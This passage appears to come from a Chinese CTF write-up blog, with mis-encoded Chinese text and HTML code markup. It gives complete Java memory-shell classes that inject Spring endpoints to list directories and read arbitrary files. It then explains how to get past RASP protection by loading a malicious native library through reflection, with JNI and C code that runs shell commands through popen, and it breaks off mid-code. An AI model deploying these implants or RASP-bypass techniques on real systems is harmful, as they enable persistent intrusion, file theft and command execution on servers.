class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls1&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls1&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file!=<span class="literal">null</span>) &#123;</span><br><span class="line">                        response.getWriter().write(file.getAbsolutePath()+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112020.png" alt="å¾®ä¿¡æˆªå›¾_20231106112020"></p><p>è¿™æ ·çœ‹èµ·æ¥èˆ’æœå¤šäº†,ğŸ‘´å¾ˆä¸­æ„ğŸ˜Š</p><h3 id="è¯»æ–‡ä»¶"><span id="è¯»æ–‡ä»¶"> è¯»æ–‡ä»¶</span></h3><p>ğŸ‘´æƒ³å°è¯•æŸç’æ¯çš„ä»£ç ,ç›´æ¥é€šè¿‡<code>ResponseEntity</code>ä¸‹è½½æ–‡ä»¶,å¾ˆå¯æƒœ,å¤±è´¥äº†,ä½†æ˜¯æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„è¯»å–,æ€ä¹ˆåŠ,ğŸ‘´ç”¨base64è¯»å‡ºæ¥,ğŸ‘´çœŸtmæ˜¯å®Œç¾å¤©æ‰çš„idol(bushi)</p><p>ç»ˆäºğŸ‘´æƒ³æ˜ç™½äº†ä¸€ä»¶äº‹,å†™å‡ºäº†å†…å­˜ğŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exre</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exre.class.getMethod(<span class="string">&quot;readfile2&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/readfile2&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exre</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exre</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readfile2</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filepath&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(filePath!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">byte</span>[] fileBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(fileBytes);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">                response.getWriter().write(base64String);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆ,ä½ è¯´ä½ ä¸ä¼šbase64è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶?ğŸ¤£</p><p>è‡ªå·±å†™ä¸ªè„šæœ¬è½¬æ¢éƒ½è¡Œ,ğŸ‘´å‘Šè¯‰ä½ ,è¿˜èƒ½ä¸Šcyberchefè½¬æ¢,è¿˜èƒ½å¯¼å‡ºä¸ºæ–‡ä»¶ğŸ˜…</p><h2 id="rasp"><span id="rasp"> RASPğŸ˜…ğŸ˜¡</span></h2><p>ç»•è¿‡content-lengthå°±ç®€å•äº†?8å¯èƒ½!</p><p>nmbç”šè‡³æœ‰RASP,âˆšâ…§,ğŸ‘´æ²¡å­¦è¿‡.</p><h3 id="å•¥äº‹rasp"><span id="å•¥äº‹rasp"> å•¥äº‹RASP</span></h3><p>åœ¨2012å¹´çš„æ—¶å€™ï¼ŒGartnerå¼•å…¥äº†<code>Runtime application self-protection</code>ä¸€è¯ï¼Œç®€ç§°ä¸ºRASPã€‚å®ƒæ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ ·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºèä¸ºä¸€ä½“ï¼Œèƒ½å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ï¼Œå½“åº”ç”¨ç¨‹åºé­å—åˆ°å®é™…æ”»å‡»ä¼¤å®³ï¼Œå°±å¯ä»¥è‡ªåŠ¨å¯¹å…¶è¿›è¡Œé˜²å¾¡ï¼Œè€Œä¸éœ€è¦è¿›è¡Œäººå·¥å¹²é¢„ã€‚</p><p>RASPæŠ€æœ¯å¯ä»¥å¿«é€Ÿçš„å°†å®‰å…¨é˜²å¾¡åŠŸèƒ½æ•´åˆåˆ°æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ‹¦æˆªä»åº”ç”¨ç¨‹åºåˆ°ç³»ç»Ÿçš„æ‰€æœ‰è°ƒç”¨ï¼Œç¡®ä¿å®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå¹¶ç›´æ¥åœ¨åº”ç”¨ç¨‹åºå†…éªŒè¯æ•°æ®è¯·æ±‚ã€‚Webå’ŒéWebåº”ç”¨ç¨‹åºéƒ½å¯ä»¥é€šè¿‡RASPè¿›è¡Œä¿æŠ¤ã€‚è¯¥æŠ€æœ¯ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„è®¾è®¡ï¼Œå› ä¸ºRASPçš„æ£€æµ‹å’Œä¿æŠ¤åŠŸèƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿä¸Šè¿è¡Œçš„ã€‚</p><p>ğŸ‘´è¯´äººè¯:å°±æ˜¯nmæŠŠå†…å­˜è¿‡æ»¤,å®æ—¶åŠ¨æ€é˜²æŠ¤.åˆ«äººå«å†…å­˜é©¬,ä½ å«å†…å­˜ç›¾.</p><p>è‡³äºè¿™ç©æ„,ğŸ‘´å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†,å…ˆç­‰ğŸ‘´æ–°å¼€ä¸ªæ–‡ç« ,è®°å½•ä¸€ä¸‹RASPçš„å­¦ä¹ ç¬”è®°.</p><p>ğŸ‘´å›æ¥äº†,åˆ°äº†æœ€åçš„æ­¥éª¤äº†.,çœ‹ğŸ‘´ç»•è¿‡è¿™è¯¥æ­»çš„RASP.</p><p>é€šè¿‡java-agentæ’æ¡©æŠ€æœ¯,hookä½äº†ä¸€äº›åº•å±‚çš„ç±»,ä½¿å¾—javaçš„execä¸èƒ½å¤Ÿæ‰§è¡Œ</p><p>ä¸€èˆ¬æ˜¯unixæˆ–è¿™forkandexec</p><p><code>forkAndExec</code> é€šå¸¸æ˜¯ä¸æ“ä½œç³»ç»Ÿè¿›ç¨‹ç®¡ç†ç›¸å…³çš„æ“ä½œï¼Œç”¨äºåœ¨ç±»Unixæ“ä½œç³»ç»Ÿä¸­ï¼ˆå¦‚Linuxï¼‰åˆ›å»ºå­è¿›ç¨‹å¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p><p>å¯æ¶çš„RASP hookä½äº†è¿™äº›ç±»</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112422.png" alt="å¾®ä¿¡æˆªå›¾_20231106112422"></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112531.png" alt="å¾®ä¿¡æˆªå›¾_20231106112531"></p><p>ç”šè‡³è¿˜ä¸è®©æœ¬åœ°JNIåŠ è½½äº†,<code>loadLibrary0</code>ä¹Ÿè¢«hookäº†</p><h2 id="è§£å†³æ–¹æ¡ˆ"><span id="è§£å†³æ–¹æ¡ˆ"> è§£å†³æ–¹æ¡ˆğŸ˜’</span></h2><p>åº•å±‚çš„nativeæ–¹æ³• <code>java.lang.ClassLoader.NativeLibrary#load</code> å¹¶æœªè¢«hookï¼Œå¹¶ä¸”åå°„ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨åå°„æ¥è°ƒç”¨ <code>java.lang.ClassLoader.NativeLibrary</code> ä¸­çš„ <code>load</code> æ–¹æ³•æ¥åŠ è½½æ¶æ„soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤</p><p>èˆ¹æ–°å§¿åŠ¿ä¹‹<code>javah</code></p><p>å¯ä»¥,æˆ‘å°±å–œæ¬¢hğŸ˜Š</p><p><code>javah</code> æ˜¯ Java å¼€å‘å·¥å…·åŒ… (JDK) æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç”Ÿæˆ Java ç±»çš„æœ¬åœ°æ–¹æ³•æ¥å£ (Native Method Interface, JNI) å¤´æ–‡ä»¶ã€‚JNI å…è®¸ Java ä»£ç ä¸æœ¬åœ°ï¼ˆé€šå¸¸æ˜¯Cæˆ–C++ï¼‰ä»£ç è¿›è¡Œäº¤äº’ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸ç¡¬ä»¶äº¤äº’æˆ–ä¸ç°æœ‰çš„æœ¬åœ°åº“è¿›è¡Œé›†æˆã€‚</p><p>ç¼–å†™åŒ…å«æœ¬åœ°æ–¹æ³•å£°æ˜çš„ Java ç±»ï¼Œä½¿ç”¨ <code>native</code> å…³é”®å­—å£°æ˜æœ¬åœ°æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨javacç¼–è¯‘æˆclass,ç„¶åä½¿ç”¨javahç¼–è¯‘æˆhæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javah -jni EvilClass</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„EvilClass.hå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class EvilClass */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_EvilClass</span><br><span class="line">#define _Included_EvilClass</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     EvilClass</span></span><br><span class="line"><span class="comment"> * Method:    execCmd</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜è¦æ ¹æ®è¿™ä¸ªhæ–‡ä»¶å†™Cæ–‡ä»¶,nmğŸ‘´ä¸ä¼šc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//å®šä¹‰ç¼“å†²åŒº</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">&quot;r&quot;</span>); <span class="comment">//æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe))</span><br><span class="line">        &#123; <span class="comment">//å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pipe); <span class="comment">//å…³é—­ç®¡é“</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªç¼“å†²åŒº,<code>popen</code>æ˜¯Cä¸­æ‰§è¡Œå‘½ä»¤æ—¶æ‰“å¼€çš„ä¸€ä¸ªç®¡é“,ä»¥åªè¯»æ¨¡å¼æ‰“å¼€.å¦‚æœä¸ºç©º,åˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥,è¿”å›.</p><p>åŒæ—¶whileä½¿ç”¨feofæ£€æµ‹pipeçŠ¶æ€,æœªç»“æŸå°±æŒç»­ä»pipeé‡Œé¢æ¯æ¬¡æœ€å¤§è·å–128ä¸ªå­—èŠ‚å†…å®¹,æ”¾åˆ°ç¼“å†²åŒº,ç„¶åå°†ç»“æœè¿½åŠ åˆ°<code>result</code>ä¸­.</p><p>éšå</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span><span class="params">(JNIEnv *env, jclass class_object, jstring jstr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>); <span class="comment">// è·å– Java å­—ç¬¦ä¸² jstr çš„ UTF-8 ç¼–ç </span></span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå­˜æ”¾å‘½ä»¤æ‰§è¡Œç»“æœçš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result)) <span class="comment">// è°ƒç”¨ä¹‹å‰å®šä¹‰çš„ execmd å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä½†ä»£ç ä¸­è¢«æ³¨é‡Šæ‰äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// 